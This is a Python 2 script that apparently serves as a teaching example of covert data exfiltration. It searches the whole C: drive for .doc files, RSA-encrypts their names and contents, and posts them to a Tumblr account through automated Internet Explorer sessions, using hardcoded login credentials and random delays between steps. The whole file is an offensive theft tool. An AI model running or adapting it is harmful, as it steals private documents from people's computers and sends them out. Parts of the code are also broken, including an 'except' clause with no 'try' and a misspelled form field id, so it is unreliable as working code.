import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "jms@bughunter.ca"
password = "dustinBHP2014"

public_key = ""


def wait_for_browser(browser):
    
    #wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
        
    return

def encrypt_string(plaintext):
    
    chunk_size = 256
    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)
    
    print "Encrypting %d bytes" % len(plaintext)
    
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    
    encrypted = ""
    offset    = 0
    
    while offset < len(plaintext):
        
        chunk = plaintext[offset:offset+chunk_size]
        
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
            
        encrypted += rsakey.encrypt(chunk)
        offset    += chunk_size
        
        
    encrypted = encrypted.encode("base64")
    
    print "Base64 encoded crypto: %d" % len(encrypted)
    
    return encrypted

def encrypt_post(filename):
    
    #open and read the file
    fd = open(filename,"rb")
    contents = fd.read()
    fd.close()
    
    encrypted_title = encrypt_string(filename)
    encrypted_body  = encrypt_string(contents)
    
    
    return encrypted_title,encrypted_body

def random_sleep():
    time.sleep(random.randint(5,10))
    return

def login_to_tumbr(ie):
    
    # retrieve all elements in the document
    full_doc = ie.Document.all
    
    # iterate looking for the login form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value",username)
        elif i.id == "singup_password":
            i.setAttribute("value",password)
            
    random_sleep()
    
    # you can be presented with different home pages
    if ie.Document.forms[0].id == "signup_form":
        ie.Document.forms[0].submit()
    else:
        ie.Document.forms[1].submit()
    except IndexError, e:
        pass
    
    random_sleep()
    
    
    # the login form is the second form on the page
    wait_for_browser(ie)
    
    return

def post_to_tumblr(ie,title,post):
    
    full_doc = ie.Document.all
    
    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value",title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML",post)
            print "set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()
            
    # move focus away from the main content box
    random_sleep()
    title_box.focus()
    random_sleep()
    
    # post the form
    post_form.children[0].click()
    wait_for_browser(ie)
    
    random_sleep()
    
    return

def exfiltrate(document_path):
    
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1
    
    # head to tumblr and login
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)
    print "logging in..."
    login_to_tumbr(ie)
    print "logging in...navigating"
    
    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)
    
    # encrypt the file
    title,body = encrypt_post(document_path)
    
    print "Creating new post..."
    post_to_tumblr(ie,title,body)
    print "Posted!"
    
    # destroy the IE instance
    ie.Quit()
    ie = None
    
    return

# main loop for document discovery
# NOTE: no tab for first line of code below
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent,filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")